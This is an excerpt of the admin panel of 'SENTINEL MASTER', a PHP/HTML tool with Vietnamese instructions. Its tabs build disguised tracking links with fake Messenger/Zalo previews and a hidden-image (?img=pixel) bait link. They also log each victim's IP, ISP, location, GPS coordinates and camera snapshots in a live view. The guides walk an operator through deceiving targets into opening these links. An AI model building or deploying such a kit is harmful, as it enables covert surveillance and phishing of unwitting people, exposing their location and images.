...
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
    :root { --hot1:#ff4e00; --hot2:#ff9a00; --bg-dark:#0d0d1a; --card-bg:#14142a; --card-border:rgba(255,78,0,0.25); --input-bg:#1a1a30; --input-border:rgba(255,78,0,0.35); --text-main:#f0e8ff; --text-muted:#8c849e; --label-color:#d4c8f0; }
    body { background: var(--bg-dark); background-image: radial-gradient(ellipse at 0% 0%, rgba(255,78,0,0.12) 0%, transparent 55%), radial-gradient(ellipse at 100% 100%, rgba(255,0,80,0.08) 0%, transparent 55%); font-family: 'Inter', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
    .glass { background: var(--card-bg); backdrop-filter: blur(25px); border: 1px solid var(--card-border); padding: 3.5rem; border-radius: 3rem; text-align: center; width: 100%; max-width: 400px; box-shadow: 0 0 100px rgba(0,0,0,1); }
    input { background: var(--input-bg); border: 1px solid var(--input-border); padding: 1.25rem; border-radius: 1.5rem; color: var(--text-main); width: 100%; text-align: center; font-weight: 900; outline: none; margin-bottom: 1.5rem; }
    button { background: linear-gradient(135deg,var(--hot1),var(--hot2)); color: white; padding: 1rem; border-radius: 1.5rem; width: 100%; font-weight: 900; text-transform: uppercase; cursor: pointer; }
</style></head>
<body><form method="POST" class="glass"><h2 class="font-black italic mb-10 tracking-widest uppercase" style="background:linear-gradient(90deg,#ff4e00,#ff9a00,#e8001d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">SENTINEL MASTER</h2><input type="password" name="p" placeholder="ACCESS KEY" autofocus><button type="submit">Login</button></form></body></html>
<?php exit; }
...
<style>
    ...
    :root { --hot1:#ff4e00; --hot2:#ff9a00; --bg-dark:#0d0d1a; --card-bg:#14142a; --card-border:rgba(255,78,0,0.25); --input-bg:#1a1a30; --input-border:rgba(255,78,0,0.35); --text-main:#f0e8ff; --text-muted:#8c849e; --label-color:#d4c8f0; --deep:var(--bg-dark); --card:var(--card-bg); --neon:var(--hot1); --dim:var(--text-muted); }
    * { box-sizing: border-box; }
    body { background: var(--bg-dark); background-image: radial-gradient(ellipse at 0% 0%, rgba(255,78,0,0.12) 0%, transparent 55%), radial-gradient(ellipse at 100% 100%, rgba(255,0,80,0.08) 0%, transparent 55%); color: var(--text-main); font-family: 'Segoe UI', system-ui, sans-serif; }
    ...
    .link-subtab.active { background: linear-gradient(135deg,var(--hot1),var(--hot2)); color: #fff; border-color: var(--hot1); box-shadow:0 0 0 2px rgba(255,78,0,0.15); }
    .link-guide, .admin-guide { display: block; } .link-guide.hidden-guide, .admin-guide.hidden-guide { display: none; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    .card { background: var(--card); border: 1px solid var(--card-border); border-radius: 1.25rem; padding: 2rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
    input, textarea { background: var(--input-bg); border: 1px solid var(--input-border); padding: 1rem; border-radius: 0.75rem; color: var(--text-main); width: 100%; outline: none; }
    ...
    .sidebar-btn.active { color: white; border-bottom: 2px solid var(--hot1); background: rgba(255,78,0,0.12); box-shadow: inset 0 0 0 1px rgba(255,78,0,0.18); }
    .btn-pro { background: linear-gradient(135deg,var(--hot1),var(--hot2)); color: white; padding: 1rem; border-radius: 2rem; font-weight: 900; text-transform: uppercase; border:none; cursor:pointer; width: 100%; }
    ...
    .toggle-card input { width: 1.15rem; height: 1.15rem; accent-color: var(--hot1); flex: none; }
    ...
    @media (max-width: 768px) {
        ...
        aside { width: 100%; flex-direction: row; overflow-x: auto; border-right: 0; border-bottom: 1px solid var(--card-border); padding: 1rem; gap: 0.5rem; position: sticky; top: 0; z-index: 20; background: rgba(13,13,26,0.95); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); }
...
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    ...
    <main class="flex-1 p-10 overflow-auto ios-safe">
        <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
            <div class="space-y-6">
                <form method="POST" id="lF" class="card space-y-4 shadow-2xl">
                    <div class="flex items-center justify-between gap-3"><h3 class="text-blue-500 text-[9px] uppercase italic">Fake Link Setup</h3><button type="button" onclick="toggleGuidesIn('t1',this)" class="bg-amber-600 text-white px-3 py-2 rounded-xl font-black uppercase text-[7px]">ẨN / HIỆN HƯỚNG DẪN</button></div>
                    <div class="admin-guide bg-slate-950 border border-blue-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                        <b>Hướng dẫn Dự án chiến dịch:</b><br>
                        1) <b>ID Link</b>: đặt tên ngắn, không dấu, ví dụ <code>khuyen-mai-01</code>. Đây là phần sau <code>?v=</code>.<br>
                        2) <b>Tiêu đề / mô tả / ảnh</b>: nội dung sẽ hiển thị khi chia sẻ link lên Messenger, Zalo hoặc website.<br>
                        3) <b>Link đích</b>: nơi người xem được chuyển đến sau khi mở link.<br>
                        4) Bật/tắt camera/micro nếu chiến dịch cần xin quyền; trình duyệt luôn hỏi người xem, hệ thống không tự cấp quyền thay họ.<br>
                        5) Bấm <b>Lưu dự án</b>, sau đó copy link dạng <code>?v=ID</code> trong bảng bên phải.
                    </div>
        ...
        <div id="t2" class="tab-content space-y-8">
            <div class="flex justify-between items-center gap-3"><h2 class="text-white text-xl uppercase italic">🛰️ NHẬT KÝ LIVE</h2><div class="flex gap-2"><button type="button" onclick="toggleGuidesIn('t2',this)" class="bg-amber-600 text-white px-4 py-2 rounded-xl italic font-black uppercase text-[8px]">ẨN / HIỆN HƯỚNG DẪN</button><button onclick="location.href='?admin&clear_logs=1'" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic font-black uppercase">🗑️ DỌN SẠCH</button></div></div>
            <div class="admin-guide bg-slate-950 border border-blue-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                <b>Hướng dẫn Nhật ký live:</b><br>
                1) Mỗi dòng là một lượt mở link/ghi nhận từ người xem.<br>
                2) Cột <b>Target/Cam</b> hiển thị ID link và ảnh camera nếu người xem đã đồng ý cấp quyền.<br>
                3) Bấm vào IP để xem nhanh ISP, thành phố/quốc gia và trạng thái proxy/VPN ước tính.<br>
                4) Nếu có tọa độ, bấm <b>LIVE</b> để xem trên bản đồ trong trang hoặc <b>G-MAPS</b> để mở Google Maps.<br>
                5) Nút <b>Dọn sạch</b> xóa toàn bộ nhật ký, nên cân nhắc trước khi bấm.
            </div>
        ...
        <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <form method="POST" action="?admin&t=3" class="card space-y-4 shadow-2xl">
                    <div class="flex items-center justify-between gap-3"><h3 class="text-purple-500 italic uppercase">TRÌNH TẠO (Ảnh ẩn)</h3><button type="button" onclick="toggleGuidesIn('t3',this)" class="bg-amber-600 text-white px-3 py-2 rounded-xl font-black uppercase text-[7px]">ẨN / HIỆN HƯỚNG DẪN</button></div>
                    <p class="text-[7px] text-slate-400 italic">Tùy chỉnh nội dung hiển thị cho link ảnh ẩn (?img=pixel) khi dán vào Zalo/FB.</p>
                    <div class="admin-guide bg-slate-950 border border-purple-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                        <b>Hướng dẫn Trình tạo ảnh ẩn:</b><br>
                        1) Nhập <b>tiêu đề, mô tả, ảnh meta</b> để quyết định nội dung hiện khi chia sẻ link <code>?img=pixel</code>.<br>
                        2) Nhập <b>ảnh thật mục tiêu xem</b> ở ô “Mồi HD”; ảnh này hiển thị trên trang sau khi mở link.<br>
                        3) Bật camera trước/sau nếu muốn hỏi quyền chụp ảnh; chỉ gửi khi người xem bấm đồng ý trên trang.<br>
                        4) Xem preview bên phải để biết link sẽ trông như thế nào khi gửi Messenger/Zalo.<br>
                        5) Bấm <b>Cập nhật link</b>, rồi copy link <code>?img=pixel</code>.
                    </div>
    ...
    <script>
        ...
        function toggleGuidesIn(scopeId, btn){
            const guides=document.querySelectorAll(`#${scopeId} .admin-guide`);
            const willHide=[...guides].some(g=>!g.classList.contains('hidden-guide'));
            guides.forEach(g=>g.classList.toggle('hidden-guide', willHide));
            if(btn) btn.innerText=willHide?'HIỆN HƯỚNG DẪN':'ẨN HƯỚNG DẪN';
        }
